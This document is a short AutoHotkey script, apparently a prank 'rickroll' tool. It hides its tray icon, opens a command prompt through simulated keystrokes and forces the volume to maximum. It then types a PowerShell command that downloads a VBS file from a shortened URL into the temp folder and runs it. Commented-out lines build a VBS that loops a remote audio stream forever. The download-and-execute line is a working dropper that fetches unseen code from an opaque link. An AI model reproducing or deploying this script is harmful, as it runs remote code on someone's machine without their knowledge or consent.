#NoEnv
#Persistent
#NoTrayIcon
SendMode Input
Sleep 3500
Send #{space}
Sleep 200
Send #{space}
Sleep 200
Send #r
Sleep 200
Send {Shift}
Send {Delete}
Send {Delete}
Send {Delete}
Send {Delete}
Sleep 200
Send cmd
Send {enter}
Sleep 200
Send {Shift}
Sleep 200
SoundGet, MuteState, Master, Mute
if MuteState=On 
{
	send {Volume_Mute}
}
SoundSet, 100
Send powershell (new-object System.Net.WebClient).DownloadFile('https://tinyurl.com/2fzp97ve','`%tmp`%\\rickU.vbs'); && start `%tmp`%\\rickU.vbs && exit
Send {enter}
ExitApp
; Send del `%tmp`%\rickyou.vbs
; Send {enter}
; Sleep 200
; Send del `%tmp`%\volup.vbs
; Send {enter}
; Sleep 200
; Send cd `%tmp`% && copy con rickyou.vbs
; Send {enter}
; Send While true
; Send {enter}
; Send Dim oPlayer
; Send {enter}
; Send Set oPlayer = CreateObject("WMPlayer.OCX")
; Send {enter}
; Send oPlayer.URL = "http://tinyurl.com/s63ve48"
; Send {enter}
; Send oPlayer.controls.play
; Send {enter}
; Send While oPlayer.playState <> 1 ' 1 = Stopped
; Send {enter}
; Send WScript.Sleep 100
; Send {enter}
; Send Wend
; Send {enter}
; Send oPlayer.close
; Send {enter}
; Send Wend
; Send {enter}
; Sleep 100
; Send ^z

